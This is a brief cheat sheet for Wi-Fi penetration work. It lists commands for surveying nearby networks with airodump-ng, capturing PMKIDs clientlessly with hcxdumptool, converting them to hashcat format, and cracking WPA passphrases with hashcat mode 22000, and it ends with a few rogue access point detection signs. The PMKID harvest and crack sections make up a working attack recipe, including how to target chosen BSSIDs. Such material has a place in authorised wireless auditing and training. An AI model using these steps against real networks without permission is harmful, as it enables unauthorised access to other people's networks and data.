# Cheatsheet — PMKID + rogue survey

## Airspace survey

```bash
iw dev                                     # your radios
sudo airodump-ng wlan1                     # all BSSIDs + clients
sudo airodump-ng wlan1 --band abg
# Columns: BSSID | PWR | Beacons | CH | ENC | ESSID
```

## PMKID harvest (clientless)

```bash
sudo hcxdumptool -i wlan1 -o out.pcapng --enable_status=15
# wait ~60s, then Ctrl-C

hcxpcapngtool -o pmkid.22000 out.pcapng    # → hashcat format
cat pmkid.22000                            # WPA*01*PMKID*...*SSID-hex
```

## Crack

```bash
hashcat -m 22000 pmkid.22000 wordlist.txt
hashcat -m 22000 pmkid.22000 --show
```

## Rogue detection signs

- Open (OPN) encryption next to corporate WPA2
- SSID not on authorized list
- Same channel range, better signal (closer to users)
- Corporate clients associated to unknown BSSID

## hcxdumptool flags worth knowing

| Flag | Purpose |
|---|---|
| `-i` | interface |
| `-o` | output pcapng |
| `--filterlist_ap=` | target only these BSSIDs |
| `--enable_status=15` | status output |

Requires `iw` + interface up: `sudo ip link set wlan1 up`
